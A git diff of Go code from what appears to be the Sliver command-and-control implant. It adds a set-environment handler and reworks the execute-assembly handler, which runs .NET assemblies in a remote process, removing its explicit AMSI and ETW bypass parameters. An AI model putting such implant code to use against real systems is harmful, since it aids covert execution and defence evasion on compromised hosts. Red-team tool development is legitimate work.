@@ -57,6 +57,7 @@ var (
 		sliverpb.MsgStopServiceReq:     stopService,
 		sliverpb.MsgRemoveServiceReq:   removeService,
 		sliverpb.MsgEnvReq:             getEnvHandler,
+		sliverpb.MsgSetEnvReq:          setEnvHandler,
 		sliverpb.MsgExecuteTokenReq:    executeTokenHandler,
 
 		// Platform specific
@@ -174,10 +175,7 @@ func getsystemHandler(data []byte, resp RPCResponse) {
 }
 
 func executeAssemblyHandler(data []byte, resp RPCResponse) {
-	//{{if .Config.Debug}}
-	log.Println("executeAssemblyHandler called")
-	//{{end}}
-	execReq := &sliverpb.ExecuteAssemblyReq{}
+	execReq := &sliverpb.InvokeExecuteAssemblyReq{}
 	err := proto.Unmarshal(data, execReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -185,7 +183,7 @@ func executeAssemblyHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-	output, err := taskrunner.ExecuteAssembly(execReq.HostingDll, execReq.Assembly, execReq.Process, execReq.Arguments, execReq.AmsiBypass, execReq.EtwBypass, execReq.Offset)
+	output, err := taskrunner.ExecuteAssembly(execReq.Data, execReq.Process)
 	execAsm := &sliverpb.ExecuteAssembly{Output: []byte(output)}
 	if err != nil {
 		execAsm.Response = &commonpb.Response{
